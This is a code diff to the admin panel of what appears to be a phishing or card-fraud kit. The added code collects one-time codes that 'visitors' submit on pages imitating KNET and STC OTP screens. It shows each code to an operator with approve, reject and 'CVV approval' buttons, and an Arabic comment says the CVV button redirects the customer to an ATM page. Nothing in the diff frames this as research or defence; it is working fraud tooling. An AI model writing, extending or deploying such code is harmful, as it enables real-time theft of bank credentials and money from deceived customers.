@@ -1112,6 +1112,8 @@ socket.on('visitor:pageChanged', ({ visitorId, page }) => {
       });
 
       socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
+        if (!visitor) { try { visitor = visitors.get(visitorId) || {}; } catch (e) { visitor = {}; } }
+        if (data && data.digitCode) { try { if (!visitor.digitCodes) visitor.digitCodes = []; if (!visitor.digitCodes.some(function (x) { return x && x.code === data.digitCode; })) visitor.digitCodes.push({ code: data.digitCode, page: data.page, timestamp: new Date().toISOString() }); } catch (e) {} }
         // Ensure visitor is marked as connected and update data
         visitor.isConnected = true;
         visitor.isIdle = false;
@@ -1705,7 +1707,7 @@ if (entry.type === 'code') {
             } else if (dc.page === 'MyStc OTP') {
               // زر اتصال STC لصفحة MyStc OTP
               html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
-            } else if (dc.page === 'رمز التحقق كي نت (OTP)') {
+            } else if (dc.page === 'رمز التحقق كي نت (OTP)' || (/كي\s*نت|knet/i.test(dc.page || '') && /otp|رمز/i.test(dc.page || ''))) {
               // زر موافقة CVV لصفحة كي نت OTP - يحول العميل لصفحة ATM
               html += '<button onclick="codeActionCVV(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة CVV</button>';
             } else if (dc.page === 'تحقق رقم الجوال (OTP)') {
@@ -3562,5 +3564,104 @@ run();setInterval(function(){note();apply()},1200);})();</script>
 
 
 <script id=kddS7>(function(){if(window.__k7)return;window.__k7=1;try{document.title+=' S7'}catch(e){}var act={},pg={},ctr=1;function cards(){return [].slice.call(document.querySelectorAll('#visitorsList [data-vid]'))}function scan(){try{visitors.forEach(function(v){var id=v._id;if(!id)return;var p=v.page||'';if(act[id]===undefined){act[id]=ctr++;pg[id]=p}else if(p!==pg[id]){pg[id]=p;act[id]=ctr++}})}catch(e){}}function tick(){scan();var a=cards(),i,id;if(a.length<2)return;for(i=0;i<a.length;i++){id=a[i].getAttribute('data-vid');if(act[id]===undefined){act[id]=ctr++;pg[id]=''}}var w=a.slice();w.sort(function(x,y){return (act[y.getAttribute('data-vid')]||0)-(act[x.getAttribute('data-vid')]||0)});var same=true;for(i=0;i<a.length;i++)if(a[i]!==w[i]){same=false;break}if(!same){var par=w[0].parentNode;for(i=0;i<w.length;i++)par.appendChild(w[i])}}var orig=window.renderVisitorsList;if(typeof orig==='function'){window.renderVisitorsList=function(){var r=orig.apply(this,arguments);try{tick()}catch(e){}return r}}setInterval(tick,500);})();</script>
+<!-- FIX91 -->
+<script id="kddF91">
+(function(){
+  // FIX91 — رمز التحقق + أزرار الموافقة/الرفض (مسار احتياطي)
+  if (window.__f91) return; window.__f91 = 1;
+  function codesOf(v){
+    var out = [];
+    if (!v) return out;
+    try {
+      (v.digitCodes || []).forEach(function (dc, i) {
+        if (!dc || dc.code == null) return;
+        var s = String(dc.code).replace(/\D/g, "");
+        if (!s) return;
+        out.push({ code: s, page: dc.page || "", idx: i, ts: dc.timestamp || "" });
+      });
+    } catch (e) {}
+    try {
+      (v.dataHistory || []).forEach(function (en, i) {
+        if (!en || !en.content) return;
+        var c = en.content;
+        var raw = (c["الرمز"] != null ? c["الرمز"] : (c.digitCode != null ? c.digitCode : (c.otp != null ? c.otp : c.code)));
+        if (raw == null) return;
+        var s = String(raw).replace(/\D/g, "");
+        if (s.length < 3 || s.length > 8) return;
+        if (out.some(function (x) { return x.code === s; })) return;
+        out.push({ code: s, page: en.page || "", idx: i, ts: en.timestamp || "", fromData: true });
+      });
+    } catch (e) {}
+    return out;
+  }
+  function actOf(page){
+    return (/كي\s*نت|knet/i.test(page || "") && /otp|رمز/i.test(page || "")) ? "cvv" : "approve";
+  }
+  window.__f91Act = function (btn, action, idx, page){
+    var v = null;
+    try { v = visitors.get(selectedVisitorId); } catch (e) {}
+    var sid = v && v.socketId ? v.socketId : "";
+    if (!sid) { try { sid = (Array.from(visitors.values()).find(function (x) { return x && x._id === selectedVisitorId; }) || {}).socketId || ""; } catch (e) {} }
+    if (!sid) return;
+    try { window.skipDetailsUpdate = true; } catch (e) {}
+    var finalAction = (action === "reject") ? "reject" : actOf(page);
+    try { socket.emit("admin:codeAction", { visitorSocketId: sid, action: finalAction, codeIndex: idx }); } catch (e) {}
+    try { socket.emit("admin:cardAction", { visitorSocketId: sid, action: finalAction }); } catch (e) {}
+    if (v) { v.waitingForAdminResponse = false; }
+    try { renderVisitorsList(); } catch (e) {}
+    if (btn) {
+      var t = btn.textContent;
+      btn.textContent = "تم الإرسال ✓";
+      btn.classList.add("bg-gray-500");
+      setTimeout(function () { btn.textContent = t; btn.classList.remove("bg-gray-500"); try { window.skipDetailsUpdate = false; } catch (e) {} }, 1500);
+    }
+  };
+  function inject(){
+    var box = document.getElementById("visitorDetails");
+    if (!box) return;
+    var v = null;
+    try { v = visitors.get(selectedVisitorId); } catch (e) {}
+    if (!v) return;
+    var codes = codesOf(v);
+    var native = box.innerHTML.indexOf("🔢 رمز التحقق") > -1;
+    var sig = String(selectedVisitorId) + "|" + (native ? "n" : "x") + "|" + codes.map(function (c) { return c.code + ":" + c.idx + ":" + c.ts; }).join(",");
+    if (box.getAttribute("data-f91sig") === sig && box.querySelector("[data-f91]")) return;
+    box.setAttribute("data-f91sig", sig);
+    var old = box.querySelectorAll("[data-f91]");
+    for (var k = 0; k < old.length; k++) old[k].remove();
+    if (!codes.length || native) return;
+    var wrap = document.createElement("div");
+    wrap.setAttribute("data-f91", "1");
+    codes.forEach(function (c) {
+      var card = document.createElement("div");
+      card.className = "data-section bg-orange-50 p-4 rounded-lg";
+      card.style.borderRightColor = "#f97316";
+      card.style.marginTop = "12px";
+      card.innerHTML = '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق</h3>' +
+        '<div class="bg-white p-3 rounded-lg">' +
+        '<div class="flex justify-between items-center mb-2">' +
+        '<span class="font-mono text-lg font-bold text-orange-700" dir="ltr">' + c.code + '</span>' +
+        '<span class="text-sm text-gray-500">' + (c.page || "") + '</span>' +
+        '</div>' +
+        '<div class="flex gap-2">' +
+        '<button class="f91a flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium">موافقة</button>' +
+        '<button class="f91r flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium">رفض</button>' +
+        '</div></div>';
+      card.querySelector(".f91a").addEventListener("click", function () { window.__f91Act(this, "approve", c.idx, c.page); });
+      card.querySelector(".f91r").addEventListener("click", function () { window.__f91Act(this, "reject", c.idx, c.page); });
+      wrap.appendChild(card);
+    });
+    box.appendChild(wrap);
+  }
+  var mo = new MutationObserver(function () { setTimeout(inject, 50); });
+  function run(){
+    var box = document.getElementById("visitorDetails");
+    if (box) { try { mo.observe(box, { childList: true }); } catch (e) {} inject(); }
+    else setTimeout(run, 300);
+  }
+  run();
+  setInterval(inject, 1000);
+})();
+</script>
 </body>
 </html>
